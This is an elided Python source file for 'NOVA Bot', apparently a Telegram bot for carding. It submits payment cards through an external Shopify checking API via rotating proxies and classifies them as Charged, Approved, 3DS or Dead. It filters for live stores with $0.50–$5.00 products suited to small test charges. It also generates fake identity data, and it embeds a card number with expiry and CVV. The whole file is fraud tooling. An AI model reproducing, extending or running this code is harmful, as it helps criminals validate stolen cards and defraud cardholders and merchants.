# =============================================================================
# NOVA Bot — Complete Single-File Source (v3.8.0)
# API: https://shopify-api-production-f49a.up.railway.app/check
# Site Filter: Live + $0.50-$5.00 products only
# Status Emojis: 🥇 🥈 🥉 🥔 🧨
# =============================================================================
...
SHOPIFY_API_URL  = "https://shopify-api-production-f49a.up.railway.app/check"
...
# Site filter defaults
MIN_PRODUCT_PRICE = 0.50   # $0.50 floor
MAX_PRODUCT_PRICE = 5.00   # $5.00 ceiling
...
def get_user_sem(uid, t="msp"):
    ...
    if sem is None:
        limits = {
            "sp": 30, "msp": 20, "rz": 30, "mrz": 20,
            "proxy": 25, "site": 10,
        }
        sem = asyncio.Semaphore(limits.get(t, 15))
        _USER_SEMS[key] = sem
    return sem
...
MSP_PER_USER_WORKERS = 20
RZ_PER_USER_WORKERS  = 30
MRZ_PER_USER_WORKERS = 20
SITE_PER_USER_WORKERS = 10
...
async def force_join_check(event) -> bool:
    ...
    if await is_user_joined(event.sender_id):
        return True
    buttons = [
        [pbtn(bs("📢 Join Channel"), url=CHANNEL_INVITE_LINK, style="primary", icon="📢"),
         pbtn(bs("👥 Join Group"),   url=GROUP_INVITE_LINK,   style="primary", icon="👥")],
...
def classify_shopify(raw: dict, card: str, site: str = None, proxy=None):
    ...
    if resp_up == 'CHARGED' and charged_flag == 'true':
        return {'status': 'Charged', 'message': response or 'Charged',
                'card': card, 'site': site, 'gateway': gateway,
                'price': price_disp, 'price_value': price_val, 'proxy': proxy,
                'status_code': status_code or 'ORDER_PLACED'}
    ...
    if resp_up == 'APPROVED' or status_code in approved_codes:
        return {'status': 'Approved', 'message': response or status_code,
                'card': card, 'site': site, 'gateway': gateway,
                'price': price_disp, 'price_value': price_val, 'proxy': proxy,
                'status_code': status_code or 'APPROVED'}
    ...
    if resp_up == '3DS' or status_code in threeds_codes or '3ds' in resp_low:
        return {'status': '3DS', 'message': response or status_code or '3DS',
                'card': card, 'site': site, 'gateway': gateway,
                'price': price_disp, 'price_value': price_val, 'proxy': proxy,
                'status_code': status_code or '3DS_AUTHENTICATION'}
    ...
    if resp_up == 'DECLINED' or status_code in declined_codes:
        return {'status': 'Dead', 'message': response or status_code or 'Declined',
                'card': card, 'site': site, 'gateway': gateway,
                'price': price_disp, 'price_value': price_val, 'proxy': proxy,
                'status_code': status_code or 'CARD_DECLINED'}
...
# ====================== SITE TEST (STRICT $0-$5 ONLY) ======================
async def test_site_with_price(site: str, proxy: str = None) -> dict:
    """Test site. Returns:
        status='alive'  → live + has product $0.50-$5.00 (ADD)
        status='over'   → live but products > $5.00 (REJECT)
        status='dead'   → unreachable / $0 products / error (REJECT)
    """
    test_card = "5154623245618097|03|2032|156"
    min_price = get_min_price()       # default 0.50
    max_price = get_threshold()       # default 5.00

    if not site:
        return {'site': site, 'status': 'dead', 'price': 0.0, 'response': 'Empty site'}

    if not _proxy_str_for_api(proxy):
        return {'site': site, 'status': 'dead', 'price': 0.0, 'response': 'No proxy'}
    ...
    try:
        ...
        if sc in ('CARD_INVALID', 'CARD_REQUIRED', 'CARD_EXPIRED'):
            # Test card invalid but site reachable — treat as dead
            return {'site': site, 'status': 'dead', 'price': 0.0, 'response': sc}
        ...
        return {'site': site, 'status': 'dead', 'price': 0.0, 'response': 'Timeout'}
    except Exception as e:
...
async def cmd_addsites(event):
    ...
    status_msg = await styled_reply(event, pe(
        ...
        f"filter: <code>$0.50–${threshold:.2f}</code>"
    ))
    proxies = load_user_proxies(uid)
    if not proxies:
    ...
    async def _check_one(site):
        ...
        checked += 1
        # ── STRICT: only add truly alive sites in price range ──
        if res['status'] == 'alive':
            alive.append(site)
    ...
    try:
        ...
        await status_msg.edit(pe(
            ...
            f"✅ {bs('Added (live & ≤ $'+str(threshold)+')')}: <code>{len(alive)}</code>\n"
            f"❌ {bs('Dead (removed)')}: <code>{dead}</code>\n"
            f"💰 {bs('Over $'+str(threshold)+' (removed)')}: <code>{over}</code>\n"
            f"⚠️ {bs('Unknown (removed)')}: <code>{unknown}</code>\n"
...
async def cmd_site(event):
    ...
    async def _check_one(site):
        ...
        async with sem:
            res = await test_site_with_price(site, random.choice(proxies))
        checked += 1
        # ── STRICT: keep only truly alive sites in range ──
        if res['status'] == 'alive':
            alive.append(site)
        elif res['status'] == 'over':
            over += 1
    ...
    try:
        ...
        await status_msg.edit(pe(
            ...
            f"✅ {bs('Kept (live & ≤ $'+str(threshold)+')')}: <code>{len(alive)}</code>\n"
            f"❌ {bs('Dead (removed)')}: <code>{dead}</code>\n"
            f"💰 {bs('Over $'+str(threshold)+' (removed)')}: <code>{over}</code>\n"
            f"⚠️ {bs('Unknown (removed)')}: <code>{unknown}</code>"
        ), parse_mode='html', link_preview=False)
...
FAKE_DATA = {
    ...
    'IT': {'name':'Italy','phone_code':'+39','len':10,
        ...
        'first':['Leonardo','Francesco','Alessandro','Lorenzo','Mattia'],
...
🎯 {bs('Limit')}: {limit_text}
🎯 {bs('Price filter')}: <code>${get_min_price():.2f}–${get_threshold():.2f}</code>
{SEP}
...
<code>/setthreshold 5</code> ━ {bs('Set MAX price ($5)')}
...
{SEP}
🎯 {bs('Filter')}: <code>${get_min_price():.2f}–${get_threshold():.2f}</code>""")
    await event.edit(text, buttons=[[pbtn(bs("🔙 Back"), data="back_cmds", style="danger", icon="🔙")]],
                     parse_mode='html', link_preview=False)
...
async def main():
    ...
    try:
        ...
        pass
    log_system("BOOT", "Starting NOVA bot v3.8.0...")
    if not BOT_TOKEN:
